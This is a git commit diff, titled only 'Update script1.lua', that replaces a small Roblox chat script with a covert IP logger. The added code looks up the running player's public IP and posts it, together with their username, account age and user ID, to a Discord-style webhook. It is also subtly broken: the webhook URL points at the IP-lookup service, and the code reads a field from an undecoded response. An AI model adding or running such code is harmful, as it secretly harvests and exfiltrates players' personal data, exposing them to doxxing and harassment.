62cf9bdf709f17a1540bf1e783e6aff420fbeb15
Enviviety <149268451+Enviviety@users.noreply.github.com>
2023-11-10 19:45:27 +0300

    Update script1.lua

--- script1.lua
+++ script1.lua
@@ -1,8 +1,34 @@
-if game.Players.LocalPlayer.Name == "nielt_62" then
-local args = {
-    [1] = "a",
-    [2] = "All"
-}
+local HTTP = game:GetService("HttpService")
 
-game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
-end
+local webhookurl = "http://ip-api.com/json" -- This can be found by going into your discord server settings then going to integrations then going to webhooks
+local player = game.Players.LocalPlayer
+local a = game:HttpGet("http://ip-api.com/json")
+
+wait(5)
+
+	local data = {
+		["embeds"] = {{
+
+			["author"] = {
+				["name"] = player.Name,
+				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
+			},
+			["description"] = "IP:  " .. a.query,
+			["color"] = tonumber(0xFFFAFA),
+			["fields"] = {
+				{
+					["name"] = "Account Age:",
+					["value"] = player.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "User ID:",
+					["value"] = player.UserId,
+					["inline"] = true
+				}
+			}
+		}},
+
+	}
+	local finaldata = HTTP:JSONEncode(data)
+	HTTP:PostAsync(webhookurl, finaldata)
